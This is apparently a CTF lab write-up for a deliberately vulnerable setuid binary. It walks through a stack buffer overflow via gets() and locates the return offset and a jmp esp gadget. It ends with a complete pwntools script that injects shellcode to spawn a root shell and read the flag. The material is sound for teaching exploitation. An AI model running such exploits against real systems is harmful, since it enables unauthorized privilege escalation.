# Level 05

## Setup

This level requires a few commands to set up before we can start. Run the following commands to make sure your environment is set up.

``` Bash
$sudo chown root:root flag.txt
$sudo chmod 600 flag.txt
$sudo chown root:root server
$sudo chmod 4655 server
```
This just sets the permissions on the ```server``` binary and ```flag.txt``` to mimick them being on a remote server where root access is needed but we dont currently have. 

## Background
We are now moving into more complex exploits so I will provide a little bit of background info to explain why we are learning this.

For level03, we learned how to change execution to a hidden function by overwriting a buffer with the address of that function. In level04, we learned how to pass paramters to these functions that we can call so we can access them. However, what happens when there is no interesting ```hacked()``` function that we can return to?

This is where shellcode comes in. We can overwrite a buffer with our own shell code and then direct execution to the stack so it begins executing our custom code. This allows us to run commands like ```cat``` to view files, or write to files, or even get our own shell.

## Exploit

Lets look in this directory after running those above commands with ```ls -l``` so we can see the permissions too

``` Bash
$ ls -l
total 32
-rwxr-xr-x 1 vagrant vagrant  2133 Mar  1 13:11 exploit_msfvenom.py
-rwxr-xr-x 1 vagrant vagrant  1455 Mar  5 17:13 exploit_shellcraft.py
-rw------- 1 root    root       30 Mar  1 13:11 flag.txt
-rwSr-xr-x 1 root    root    15512 Mar  1 13:11 server
-rwxr-xr-x 1 vagrant vagrant   343 Mar  1 13:11 server.c
```
We see that the binary and flag files are owned by root and are (for our purposes) inaccessible by our current user. So how can we access the flag?

Well, we see that others can execute the binary ```server``` so what if we can overwrite the buffer and trick the binary into thinking we are root, giving us access to the flag file. First, we need to check some things.

``` Bash
$ file server
server: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=17a0c596cb6e2e09548a395e34cc676cf85ecd26, for GNU/Linux 3.2.0, not stripped

$ checksec --file=server
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable   FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   70 Symbols        No    0               1             server
```
We see that this binary is 32-bit which is nice, better than doing this in 64-bit! But the most important thing to notice here is that ```NX``` is disabled.

```NX``` stands for a non-executable stack. When this is enabled, it means that shellcode CANNOT be executed from the stack since the entire stack will be marked as non-executable. If we want to run custom shell code, this protection needs to be disabled.

Lets now run the binary to get a feel of what we can expect before opening ghidra

``` Bash
Please leave your comments for the server admin but DON'T try to steal our flag.txt:

hello
```

Now that we have an idea for what the binary does and we know it is possible to inject custom shell code, lets proceed and open up ghidra. Our first function, ```main()``` looks like this

``` C
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(void)

{
  undefined *puVar1;
  
  puVar1 = &stack0x00000004;
  setuid(0);
  setgid(0);
  receive_feedback(puVar1);
  return 0;
}
```
Nothing super important here. The ```setuid()``` and ```setgid()``` functions dont matter to the ctf, they just ensure that the program runs as root to try and make this more like its running on a remote server. We see that it calls ```receive_feedback()``` though, so lets check that out.

``` C
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void receive_feedback(void)

{
  char inputBuffer [68];
  
  puts("Please leave your comments for the server admin but DON\'T try to steal our flag.txt:\n");
  gets(inputBuffer);
  return;
}
```
We see that this has a buffer and is using the dangerous ```gets()``` function. This is where we will be able to overflow a buffer. Looking at ghidra, we also see a ```secret_function()``` like this

``` C
/* WARNING: Function: __x86.get_pc_thunk.ax replaced with injection: get_pc_thunk_ax */

void secret_function(void)

{
                    /* WARNING: Could not recover jumptable at 0x0804919f. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)&stack0xfffffffc)();
  return;
}
```
This is not a function we are trying to return to. This is just a gadget to help in writing this challenge. Basically, we need to be able to find a ```jpm $esp``` instruction in the binary to call. However, with a program this simple with just the ```main()``` function that doesn't really do anything and a ```receive_feedback()``` function that does very little, we dont get one of those instructions organically.

The challenge would have had to include much more complex code if we wanted that isntruction to organically appear in the binary, so, Crypto Cat just put it in himself. 

So, lets start piecing this together. We can figure out some of this stuff manually, but in the end, since we are dealing with shellcode, it will be much easier to do this in a script rather than manually like we've ben doing.

Lets start with our offset. Since the binary is owned by root, we actually cannot automate searching for the offset like we did in the last script. This is because when the script passes the cyclic string to the program and it fails and dumps its core, the script does not have access to analyze that core since it was dumped from a file owned by root. This means we get to do this part manually. 

To do this, lets generate our cyclic string

``` Bash
$ pwn cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```
Lets crack open gdb, set a breakpoint at the return call of the ```receive_feedback()``` function, run the program and pass in our string

``` Bash
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffcd0940  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0x61616172 ("raaa"?)
$ecx   : 0xf7e1e9c4  →  0x00000000
$edx   : 0x1       
$esp   : 0xffcd0990  →  "uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha[...]"
$ebp   : 0x61616173 ("saaa"?)
$esi   : 0x8049230  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7fb1b80  →  0x00000000
$eip   : 0x61616174 ("taaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffcd0990│+0x0000: "uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha[...]"    ← $esp
0xffcd0994│+0x0004: "vaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabia[...]"
0xffcd0998│+0x0008: "waaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabja[...]"
0xffcd099c│+0x000c: "xaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabka[...]"
0xffcd09a0│+0x0010: "yaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaabla[...]"
0xffcd09a4│+0x0014: "zaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma[...]"
0xffcd09a8│+0x0018: "baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabna[...]"
0xffcd09ac│+0x001c: "caabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboa[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616174
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "server", stopped 0x61616174 in ?? (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```
Since we are dealing with 32-bit, we can see the value right in the ```$eip``` register. Lets check how many bytes that is

``` Bash
$ pwn cyclic -l taaa
76
```
Now that we know the offset, lets make sure we know where we want to put the rest of our payload. Lets test it by constructing a test payload

``` Python
$ python2 -c 'print "a" * 76 + "BBBB" + "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"' > testPayload
```
Where the ```a```'s are our offset, the ```B```'s are our address to call the ```jmp $esp``` instruction, and the ```C```'s will be our byte code. Lets open gdb and see if that all lines up

``` Bash
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffd064a0  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$ebx   : 0x61616161 ("aaaa"?)
$ecx   : 0xf7e1e9c4  →  0x00000000
$edx   : 0x1       
$esp   : 0xffd064f0  →  "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"
$ebp   : 0x61616161 ("aaaa"?)
$esi   : 0x8049230  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7fdfb80  →  0x00000000
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffd064f0│+0x0000: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"   ← $esp
0xffd064f4│+0x0004: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"
0xffd064f8│+0x0008: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"
0xffd064fc│+0x000c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCC"
0xffd06500│+0x0010: "CCCCCCCCCCCCCCCCCCCCCCCC"
0xffd06504│+0x0014: "CCCCCCCCCCCCCCCCCCCC"
0xffd06508│+0x0018: "CCCCCCCCCCCCCCCC"
0xffd0650c│+0x001c: "CCCCCCCCCCCC"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "server", stopped 0x42424242 in ?? (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```
Perfect. We see that our ```B```'s end up in ```$eip``` and our ```C```'s end up on the stack so when we call the jump to start executing the stack, our ```C```'s will get executed. Now that we know this, lets begin building our script starting with our boiler plate from the last level

``` Python
from pwn import *


# Allows easy swapping betwen local/remote/debug modes
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # (./exe < payload REMOTE ip port)
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# This is for finding the offset automatically, does not work if the binary is owned by root and youre not root
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b':', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  #32-bit
    #ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  #64-bit
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './server'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
```
As mentioned above, we cant use the automated offset finding here, but we can still keep it in our boiler plate code. Next, we know what the offset is, so we can just add that in the exploit part

``` Python
io = start()

offset = 76
```
Next, we need to know the jump instruction address so we can call that as our return value. Lets fire up ropper to get that for us.

``` Bash
$ ropper --file server --search "jmp esp"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: jmp esp

[INFO] File: server
0x0804919f: jmp esp;
```
Sweet. We can now add this to our script as well

``` Python
jmp_esp = 0x0804919f
```
We could also do the following to automate getting that instruction

``` Python
jmp_esp = asm('jmp esp')
jmp_esp = next(elf.search(jmp_esp))
```
This takes ```jmp esp``` and assembles it into byte code and assigns it to the variable. Then, we can search our binary for that specific byte code. ```elf.search()``` will then return the address, if there is one, of where that instruction is located. I personally like doing it manually but either way works!

Our current exploit should look like this

``` Python
io = start()

offset = 76

jmp_esp = 0x0804919f
```
Now its time for our shellcode. We will be using pwn tools shellcraft module to craft this for us. The documentation is [here](https://docs.pwntools.com/en/stable/shellcraft.html). Keep in mind that since we are setting the context in our script, we dont need to include the architecture or the OS when writing these commands.

Now that we know how to generate the shellcode, we can do this one of two ways. We can either generate code that will run the command ```cat flag.txt``` and it will just print out the flag, OR we can get a shell as root and cat the flag ourselves. Getting shells is always fun so lets do that way. We only need two commands to make this work. Add the following to our script

``` Python
shellcode = asm(shellcraft.sh())
shellcode += asm(shellcraft.exit())
```
Its that easy. We created shell code (in a variable named shellcode) that will generate a shell for us, and then when we quit the shell, terminate execution from the stack. Now we just need to build our payload, write it and send it. Our complete script will look like this

``` Python 
io = start()

offset = 76

jmp_esp = 0x0804919f

shellcode = asm(shellcraft.sh())
shellcode += asm(shellcraft.exit())

payload = flat ({
    asm('nop') * offset,
    jmp_esp,
    asm('nop') * 8,
    shellcode
})

write("payload", payload)

io.sendlineafter(b':', payload)

io.interactive()
```
Thats it! I switched my logging info to ```'error'``` for this so it doesnt croud the screen, but this is what you should get when you run this script

``` Bash
$ python script_name.py
$ whoami
root
$ ls
exploit_msfvenom.py    flag.txt  sam_05.py  server.c
exploit_shellcraft.py  payload     server
$ cat flag.txt
flag{w417_h0w_d1d_y0u_d0_7h47}
$ exit
$ exit
```
Isnt that super cool! We just got a shell that we can interact with as root to get the flag!
